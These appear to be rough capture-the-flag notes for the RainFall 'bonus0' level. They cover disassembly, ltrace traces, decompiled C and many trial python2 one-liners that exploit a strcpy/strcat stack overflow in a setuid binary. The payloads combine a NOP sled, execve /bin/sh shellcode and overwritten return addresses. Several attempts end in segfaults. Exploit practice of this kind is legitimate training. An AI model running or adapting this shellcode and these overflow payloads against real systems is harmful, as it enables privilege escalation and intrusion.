``` bash
bonus0@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
```

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40
   0x080485ad <+9>:	lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
```

``` bash

(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   0x08048521 <+3>:	push   edi
   0x08048522 <+4>:	push   ebx
   0x08048523 <+5>:	sub    esp,0x50
   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:	lea    eax,[ebp-0x30]
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    eax,[ebp-0x30]
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:	mov    WORD PTR [eax],dx
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   0x080485a0 <+130>:	pop    ebx
   0x080485a1 <+131>:	pop    edi
   0x080485a2 <+132>:	pop    ebp
   0x080485a3 <+133>:	ret 


   (gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018
   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>         #  read(int fd, void buf[count], size_t count);
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]             # 4104
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret 
   ```


``` bash
bonus0@RainFall:~$ ltrace ./bonus0
__libc_start_main(0x80485a4, 1, 0xbffff7f4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                          = 4
read(0, AAAAAAAAAAA
"AAAAAAAAAAA\n", 4096)                                       = 12
strchr("AAAAAAAAAAA\n", '\n')                                        = "\n"
strncpy(0xbffff6d8, "AAAAAAAAAAA", 20)                               = 0xbffff6d8
puts(" - " - 
)                                                          = 4
read(0, BBBBBBB
"BBBBBBB\n", 4096)                                           = 8
strchr("BBBBBBB\nAAA", '\n')                                         = "\nAAA" ----- > QUELLE ADRESSE??
strncpy(0xbffff6ec, "BBBBBBB", 20)                                   = 0xbffff6ec
strcpy(0xbffff726, "AAAAAAAAAAA")                                    = 0xbffff726
strcat("AAAAAAAAAAA ", "BBBBBBB")                                    = "AAAAAAAAAAA BBBBBBB"  ------> 
puts("AAAAAAAAAAA BBBBBBB"AAAAAAAAAAA BBBBBBB
) 
```

strncpy(0xbffff6ec, "BBBBBBB", 20)       # diff = 58
strcpy(0xbffff726, "AAAAAAAAAAA")


0xbffff726 -> 
->

``` bash
bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 40)'); cat) |  ./bonus0
 - 
 - 
BBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBB BBBBBBBB

```

bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)'); cat) |  ./bonus0
 - 
 - 
BBBBBBBBBBBBBBBBB  
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB

Segmentation fault (core dumped)
== 17 B

buffer1[20] + buffer2[16] + adresseEIP[4]

0xbffffebb

"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" 

shelcode[34]

copier le script dans /tmp
getenv(VAR)
("%p", getenv(VAR))

GROSCRACK -> pour recuperer au bonne endroit la string
-> 0xbffffec9 + A
= 0xbffffed3 (Alan a raison)

----------

0xbffffec9 + a = 0xbffffed3
\xc5\xfe\xff\xbf

14 14 + 10 
  f

c9 + 10
d4  + 4

"\\xd3\\xfe\\xff\\xbf"
"\xd3\xfe\xff\xbf"


AAAAAAAAAAA\xc5\xfe\xff\xbf
 - 
BBBBBBBBBBBBBBBB\\xd3\\xfe\\xff\\xbf

BBBBCCCCDDDDEEEEFFFF
BBBBCCCCD\xc5\xfe\xff\xbf


bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("BBBBCCCCDDDDE" + "\xd3\xfe\xff\xbf")'); cat)) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDE���� BBBBCCCCDDDDE����
id
Segmentation fault (core dumped)


``` bash
(gdb) run < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus0/bonus0 < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
 - 
 - 
AAAAAAAAAAAAAAAAAAAACCCCCCCCCCCCCCC���� CCCCCCCCCCCCCCC����

Program received signal SIGSEGV, Segmentation fault.
0xfffed343 in ?? ()
(gdb) 42
Undefined command: "42".  Try "help".
(gdb) run < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus0/bonus0 < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
 - 
 - 
AAAAAAAAAAAAAAAAAAAACCCCCCCCCCCCCC���� CCCCCCCCCCCCCC����

Program received signal SIGSEGV, Segmentation fault.
0x00bffffe in ?? ()
(gdb) 

```


BBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
BBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
                                       f4 0f fd b7 20             f4 0f fd b7 00

0x41414141	0x41414141
0x41414141	0x41414141	0x42424141	0x42424242
0x42424242	0x42424242	0x42424242	0x0ff44242
0x4220b7fd	0x42424242	0x42424242	0x42424242
0x42424242	0xf4424242

00b7fd0ff4


AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA




segfault a 4096 'A'

```c
void p(char *param_1,char *param_2)

{
  char *pcVar1;
  char local_100c [4104];
  
  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
  return;
}
```


run < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 4096)'))



"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
shelcode[34] 
"A" * 17 + "\n" + 1044 + "\x90" * 3000 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x80\xeb\xff\xbf"


0xbfffeb80
\x80\xeb\xff\xbf

bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write( "A" * 17 + "\n" + "B" * 2 + "\n" + "\x90" * 4035 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x80\xeb\xff\xbf")'); cat) | ./bonus0


< <(echo $(python2 -c 'import sys; sys.stdout.write( "A" * 4 + "C" * 4 + "D" * 1 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\n" * 1000 + "\x90" * 3035 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")'))


(echo "$(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n")')"; cat) | ./bonus0


ec - d8
14 -> 20
1000 -> 4096

(echo $(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') && (echo $(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n")'); cat)) | ./bonus0



(echo $(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') && (echo $(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n" )')))


(echo "$(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\x0a" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n" )')"))

(echo "$(python2 -c 'import sys; sys.stdout.write( "\n" "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')"; cat) | ./bonus0
